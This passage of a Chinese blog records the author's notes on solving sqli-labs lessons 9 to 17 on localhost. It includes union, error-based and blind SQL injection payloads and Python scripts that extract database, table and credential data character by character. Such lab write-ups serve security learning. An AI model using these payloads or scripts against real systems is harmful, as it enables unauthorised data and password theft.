class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span><br>    position = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 判断是否为空</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># 尝试每个字符</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> s<br><br><span class="hljs-comment"># 获取数据库名</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;database()&quot;</span>))<br><br><span class="hljs-comment"># 获取表名</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;&quot;</span>))<br><br><span class="hljs-comment"># 获取字段名</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;&quot;</span>))<br><br><span class="hljs-comment"># 获取用户名和密码</span><br><span class="hljs-built_in">print</span>(extract_data(<span class="hljs-string">&quot;select group_concat(username,&#x27;~&#x27;,password) from users&quot;</span>))<br></code></pre></td></tr></table></figure>
<p>叫kimi加了注释，自己小改了一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 导入requests库，用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> time      <span class="hljs-comment"># 导入time库，用于测量时间延迟</span><br><br><span class="hljs-comment"># 定义一个包含可能字符的字符串，用于猜测数据库、表和字段的名称</span><br>ALPHABET = <span class="hljs-string">&quot;,abcdefghijklmnopqrstuvwxyz0123456789_@.-&quot;</span><br><br><span class="hljs-comment"># 定义一个时间延迟，用于判断是否存在SQL注入</span><br>SLEEP_TIME = <span class="hljs-number">1</span><br><br><span class="hljs-comment"># 定义目标URL，其中包含一个SQL注入的payload模板</span><br><span class="hljs-comment"># &#123;sql&#125;：表示要执行的SQL查询</span><br><span class="hljs-comment"># &#123;position&#125;：表示当前猜测的字符位置</span><br><span class="hljs-comment"># &#123;char&#125;：表示当前猜测的字符</span><br><span class="hljs-comment"># &#123;time&#125;：表示延迟时间</span><br>URL = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-9/?id=1&#x27; and if(substr((&#123;sql&#125;),&#123;position&#125;,1)=&#x27;&#123;char&#125;&#x27;,sleep(&#123;time&#125;),1)--+&quot;</span><br><br><span class="hljs-comment"># 定义一个函数，用于发送HTTP请求并判断是否存在延迟</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inject</span>(<span class="hljs-params">path</span>):<br>    start = time.time()  <span class="hljs-comment"># 记录请求开始时间</span><br>    response = requests.get(path)  <span class="hljs-comment"># 发送HTTP GET请求</span><br>    end = time.time()   <span class="hljs-comment"># 记录请求结束时间</span><br>    <span class="hljs-comment"># 如果响应状态码为200且响应时间超过预设的延迟时间，则认为存在SQL注入</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> end - start &gt; SLEEP_TIME:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 定义一个函数，用于提取数据库、表、字段或数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">sql</span>):<br>    s = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 初始化一个空字符串，用于存储结果</span><br>    position = <span class="hljs-number">0</span>  <span class="hljs-comment"># 初始化字符位置计数器</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        position += <span class="hljs-number">1</span>  <span class="hljs-comment"># 每次循环增加字符位置</span><br>        <span class="hljs-comment"># 尝试猜测当前字符位置是否为空</span><br>        res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=<span class="hljs-string">&quot;&quot;</span>, time=SLEEP_TIME))<br>        <span class="hljs-keyword">if</span> res:<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 如果为空，退出循环</span><br>        <span class="hljs-comment"># 遍历所有可能的字符</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ALPHABET:<br>            <span class="hljs-comment"># 构造完整的URL并发送请求</span><br>            res = inject(URL.<span class="hljs-built_in">format</span>(sql=sql, position=position, char=char, time=SLEEP_TIME))<br>            <span class="hljs-keyword">if</span> res:<br>                s += char  <span class="hljs-comment"># 如果猜测正确，将字符添加到结果字符串中</span><br>                <span class="hljs-keyword">break</span>      <span class="hljs-comment"># 退出循环，继续下一个字符</span><br>    <span class="hljs-keyword">return</span> s  <span class="hljs-comment"># 返回最终结果字符串</span><br><br><span class="hljs-comment"># 获取数据库名</span><br>database = extract_data(<span class="hljs-string">&quot;database()&quot;</span>)<br><span class="hljs-built_in">print</span>(database)  <span class="hljs-comment"># 调用extract_data函数，传入SQL查询语句获取数据库名</span><br><br><span class="hljs-comment"># 获取表名</span><br>tables = extract_data(<span class="hljs-string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;&quot;</span> % database)<br><span class="hljs-built_in">print</span>(tables)<br><br><span class="hljs-comment"># 获取字段名</span><br>columns = extract_data(<span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;&quot;</span>)<br><span class="hljs-built_in">print</span>(columns)<br><br><span class="hljs-comment"># 获取用户名和密码，可以替换自己想要的表名</span><br><span class="hljs-comment">#all = extract_data(&quot;select group_concat(id,username,password) from users&quot;)</span><br><span class="hljs-comment">#print(all)</span><br></code></pre></td></tr></table></figure>
<p>我发现把逗号放最前面就不容易丢逗号了。</p>
<h1 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h1><p>就是把less9的单引号闭合改为双引号闭合：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and if(substr(database(),1,1)=&#x27;s&#x27;,1,sleep(2)) --+<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-07date-2025-03-06-21-08-00tags-sql-labs"><a href="#title-note-07date-2025-03-06-21-08-00tags-sql-labs" class="headerlink" title="title: note-07date: 2025-03-06 21:08:00tags: sql-labs"></a>title: note-07<br>date: 2025-03-06 21:08:00<br>tags: sql-labs</h2><h1 id="sql-labs-less11"><a href="#sql-labs-less11" class="headerlink" title="sql-labs-less11"></a>sql-labs-less11</h1><p>以前ctf练习题反而是post模式做的多些，<br>notice</p>
<blockquote>
<p>注意原先请求的值要改为数据库不存在的值免得将后面的查询结果覆盖  </p>
</blockquote>
<p>hackbar下的结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&#x27;union select user(),database()#&amp;passwd=&amp;submit=Submit<br></code></pre></td></tr></table></figure>
<p>之后的注入拼接进uname后  </p>
<p>爆用户和库名：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function">union <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">database</span>()#</span><br></code></pre></td></tr></table></figure>
<p>爆表名：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<p>爆字段：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br>不加<span class="hljs-keyword">and</span>后面的话好像会把其它库的同名表下的字段爆出来<br></code></pre></td></tr></table></figure>
<p>最后爆库：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure>
<h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>应该是加了检查，password不能为空</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&amp;passwd=1&quot;) <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span>#&amp;<span class="hljs-attribute">submit</span>=Submit<br></code></pre></td></tr></table></figure>
<p>回显  </p>
<blockquote>
<p>Your Login name:Dumb<br>Your Password:Dumb  </p>
</blockquote>
<p>成功闭合sql查询,然后走流程通关。</p>
<hr>
<h2 id="title-note-08date-2025-03-07-14-10-00tags-sql-labs"><a href="#title-note-08date-2025-03-07-14-10-00tags-sql-labs" class="headerlink" title="title: note-08date: 2025-03-07 14:10:00tags: sql-labs"></a>title: note-08<br>date: 2025-03-07 14:10:00<br>tags: sql-labs</h2><h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><p>只有登录成功回显，没其它信息<br>密码传入必须有字符，闭合点</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;) #</span><br></code></pre></td></tr></table></figure>
<h2 id="错误注入"><a href="#错误注入" class="headerlink" title="错误注入"></a>错误注入</h2><p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&amp;passwd=1&#x27;) or updatexml(1,concat(0x7e,(select user()),0x7e),1)#&amp;submit=Submit<br></code></pre></td></tr></table></figure>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>因为有登录成功反馈，可以使用布尔盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) or if(length(database()=8),0,1)#&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>
<p>太菜了写不出脚本，使用sqlmap,或者bp来爆破。<br>找了一个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># 网站路径</span><br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-13/&quot;</span><br><span class="hljs-comment"># 判断长度的payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or length(</span><br><span class="hljs-string">	(database())</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># 枚举字符的payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or ascii(</span><br><span class="hljs-string">	substr(</span><br><span class="hljs-string">		(database())</span><br><span class="hljs-string">	,&#123;l&#125;,1)</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># post请求参数</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;a&#x27;) or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># 判断长度</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 修改请求参数</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># 出现此内容为登录成功</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;测试成功，长度为：&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在测试长度：&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># 枚举字符</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 从第一个字符开始截取</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 枚举字符的每一种可能性</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;第&#x27;</span>, l, <span class="hljs-string">&#x27;个字符枚举成功：&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br></code></pre></td></tr></table></figure>
<p>可以换database()来实现其它注入,less13用单引号，less14用双引号<br>脚本出处：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/118094895">https://blog.csdn.net/wangyuxiang946/article/details/118094895</a></p>
<h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><p>换了闭合点，可以按less13的方式解：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&amp;password=1&quot; <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span> #&amp;<span class="hljs-attribute">submit</span>=Submit<br></code></pre></td></tr></table></figure>
<h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><p>没有报错回显，无法用报错注入，只能用布尔盲注<br>闭合点：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or true#&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>


<hr>
<h2 id="title-note-09date-2025-03-09-02-27-08tags-sql-labs"><a href="#title-note-09date-2025-03-09-02-27-08tags-sql-labs" class="headerlink" title="title: note-09date: 2025-03-09 02:27:08tags: sql-labs"></a>title: note-09<br>date: 2025-03-09 02:27:08<br>tags: sql-labs</h2><h1 id="sql-labs-less16"><a href="#sql-labs-less16" class="headerlink" title="sql-labs-less16"></a>sql-labs-less16</h1><p>先找一下注入点</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) or true#&amp;submit=Submit<br></code></pre></td></tr></table></figure>
<p>尝试报错注入，无果<br>进行盲注<br>改一下less14的脚本来用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># 网站路径</span><br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-16/&quot;</span><br><span class="hljs-comment"># 判断长度的payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&quot;) or length(</span><br><span class="hljs-string">	(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># 枚举字符的payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&quot;) or ascii(</span><br><span class="hljs-string">	substr(</span><br><span class="hljs-string">		(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;l&#125;,1)) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># post请求参数</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;a“ or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># 判断长度</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 修改请求参数</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># 出现此内容为登录成功</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;测试成功，长度为：&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在测试长度：&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># 枚举字符</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 从第一个字符开始截取</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 枚举字符的每一种可能性</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;第&#x27;</span>, l, <span class="hljs-string">&#x27;个字符枚举成功：&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br><br></code></pre></td></tr></table></figure>
<p>by：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/118094895">https://blog.csdn.net/wangyuxiang946/article/details/118094895</a><br>只用改payload中的，两个都要改不然字长对不上  </p>
<h1 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h1><p>输入正确的账户和密码：admin，admin<br>提示密码已更新<br>看来页面是能对原有用户密码进行修改<br>在less1确认了猜测是正确的。<br>没想法了去查博客，<br>查看页面源码，是对username做了过滤，会先检查库里是否有对应username<br>只能从password注入</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br>或者<br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>回显  </p>
<blockquote>
<p>You can’t specify target table ‘users’ for update in FROM clause  </p>
</blockquote>
<p>看来是不能直接爆表  </p>
<blockquote>
<p>原因是mysql数据不支持查询和更新是同一张表。所以我们需要加一个中间表。这个关卡需要输入正确账号因为是密码重置页面，所以爆出的是该账户的原始密码。如果查询时不是users表就不会报错。</p>
</blockquote>
<p>此payload创建了新的临时表x来避免对正在更新的users表进行直接查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">123456</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select * from(select concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users limit 0,1)x)))#</span><br></code></pre></td></tr></table></figure>

<p>KIMI:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; OR (updatexml(1,concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;,(SELECT concat_ws(&#x27;</span>:<span class="hljs-string">&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1))#  </span><br><span class="hljs-string">```  </span><br><span class="hljs-string">updatxml()</span><br><span class="hljs-string">```sql</span><br><span class="hljs-string">updatexml(1, concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;, data), 1)  </span><br><span class="hljs-string">如果data是一个查询结果，那么当updatexml()函数执行时，会因为xpath_expr不符合要求而报错，</span><br><span class="hljs-string">错误信息中会包含data的内容。  </span><br></code></pre></td></tr></table></figure>
<p>数据查询部分：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>, username, password) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> username, password <span class="hljs-keyword">FROM</span> users)text LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>功能：  </p>
<blockquote>
